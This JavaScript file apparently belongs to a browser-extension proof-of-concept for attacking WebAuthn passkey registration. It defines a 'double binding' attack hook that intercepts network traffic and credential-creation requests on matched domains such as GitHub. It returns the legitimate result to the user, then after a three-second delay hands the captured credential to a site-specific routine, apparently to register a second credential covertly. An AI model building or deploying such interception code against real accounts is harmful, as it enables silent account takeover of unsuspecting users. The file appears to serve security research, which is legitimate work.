import { AttackHook } from '../attacks/attack_hook';
import { getLogger } from '../logging';
import { getOriginFromUrl, prepareWebauthnCreateRequest, webauthnParse, webauthnStringify } from '../utils';
import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
import { AttackHookNone } from './attack_hook_none';
import { DoubleBindingImplementationGithub } from './double_binding_implementations/double_binding_implementation_github';

const log = getLogger('background');

export class AttackHookDoubleBinding extends AttackHookNone {
    static implementations = {
        [DoubleBindingImplementationGithub.MATCH_DOMAIN]: new DoubleBindingImplementationGithub()
    };

    getName() {
        return 'attack-double-binding';
    }

    /**
     * Handles network requests intercepted by the extension.
     * Checks if there is a domain-specific implementation for the request's hostname,
     * and delegates processing to it if available.
     *
     * @param {chrome.webRequest.WebRequestBodyDetails} details - The details of the intercepted network request.
     * @returns {chrome.webRequest.BlockingResponse} The response indicating whether to block or allow the request.
     */
    onNetwork(details) {
        const domain = new URL(details.url).hostname;
        if(domain in AttackHookDoubleBinding.implementations) {
            AttackHookDoubleBinding.implementations[domain].onNetwork(details);
        }

        return { cancel: false };
    }

    /**
     * Handles the creation of a WebAuthn credential, invoking the superclass's onCredentialGet method,
     * and then asynchronously triggers a domain-specific implementation after a delay.
     *
     * @param {WebAuthnRequestMessage} msg - The WebAuthn request message containing credential creation details.
     * @param {chrome.runtime.MessageSender} sender - The sender of the message, typically the browser extension context.
     * @returns {Promise<WebAuthnResponseMessage | WebAuthnErrorMessage>} A promise that resolves to the WebAuthn response or error message.
     */
    async onCredentialCreate(msg, sender) {
        
        console.log("attack_hook_double_bind onCredentialCreate");
        const originalReturn = await super.onCredentialGet(msg, sender);

        const createdCredential = webauthnParse(originalReturn.credential);

        // Run this in paralell after a little bit, so we return with no delay and the original request is processed
        // TODO: add some hook to verify the original request is done
        setTimeout(async () => {
            const domain = new URL(sender.url).hostname;
            if(domain in AttackHookDoubleBinding.implementations) {
                AttackHookDoubleBinding.implementations[domain].onCredentialCreate(msg, sender, createdCredential);
            }

        }, 3000);

        return originalReturn;
    }

    /**
     * Handles the retrieval of credentials in response to a WebAuthn request message.
     *
     * @param {WebAuthnRequestMessage} msg - The WebAuthn request message containing credential retrieval details.
     * @param {chrome.runtime.MessageSender} sender - The sender of the message, typically the Chrome extension runtime.
     * @returns {Promise<WebAuthnResponseMessage | WebAuthnErrorMessage>} A promise that resolves to either a WebAuthn response message or an error message.
     */
    async onCredentialGet(msg, sender) {
        return await super.onCredentialGet(msg, sender);
    }
}
